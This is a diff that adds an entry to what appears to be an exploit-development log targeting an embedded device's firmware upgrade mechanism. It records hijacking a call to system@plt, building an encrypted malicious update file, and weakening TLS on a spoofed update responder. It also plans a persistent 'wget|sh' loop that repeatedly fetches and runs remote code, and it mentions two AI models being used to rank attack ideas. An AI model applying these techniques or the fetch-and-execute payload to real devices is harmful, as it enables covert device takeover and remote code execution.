@@ -1897,3 +1897,32 @@ compat passes ⇒ the .84 non-install refusal is NOT the compat check and NOT
 the fetch gate (full 5.6MB reads ×2). It is the MinVersion/deferred/downgrade
 decision — whose trace (upgrade.log) needs one shell. The no-DNS BSU chain
 stands proven to the fetch; every offline oracle now exists.
+
+### 2026-11-06 (session 10 cont.) — DUEL SYNTHESIS + the recalibrated consensus fire
+
+The dueling-idea-wizards session (GLM vs DeepSeek, cross-scored) converged:
+- **#1 (S2 920/700): FN=0x6DCEA0 (system@plt stub itself, not 0x4ab64c)** —
+  a0-at-call preserved; beacon-first cmd.
+- **#2 (S1 890/780): FN=0x105464B0 (system@plt) with the `;`-prefix** at
+  node200+4 (r3=B).
+- **#3 (880): the trailing type-3 must be ENCRYPTED** (886499ca envelope,
+  recipient cloned) — plaintext never executes. pwned-enc.upd built+verified.
+- **#4 (810): genuine 86.11-82170 S2 upgrade exists on the CDN** (downloaded,
+  staged) — the no-downgrade-verdict install path for .135.
+- **#5 (760): /devmode statement lane** (owner 5-min portal action).
+- **TLS fix applied to the responder** (TLSv1 floor + SECLEVEL=0) — the
+  device client is TLS 1.0-only; the live responder now accepts it.
+
+EXECUTED from the synthesis: the recalibrated-band S2SYSPLT fire (fresh hit
+0x70c000, beacon-first 82B cmd, FN=0x6DCEA0): fire 200/200, unit healthy,
+NO beacon, NO 2323. Combined with the S1 SYSPLT fire (reboot, no listener):
+**the a0-at-FN-call ≠ our buffer in the post-reboot lifetimes** on both
+architectures, OR the child env kills fast children before they act. The
+next discriminator (both duelists' #2 recommendation): the persistent
+BEACON-LOOP payload (a `while:do wget|sh;sleep 15;done &` loop at node0)
+which distinguishes "no exec" from "child killed later" — the loop repeats
+if exec works at all. That fire is the next session's first action.
+
+Also verified tonight: the 65130/57.23 chroot replay reaches the exact
+verdict point (all gates pass except the fake-proc hw-set — which the real
+unit supplies); the .84 refusal is NOT the compat check.
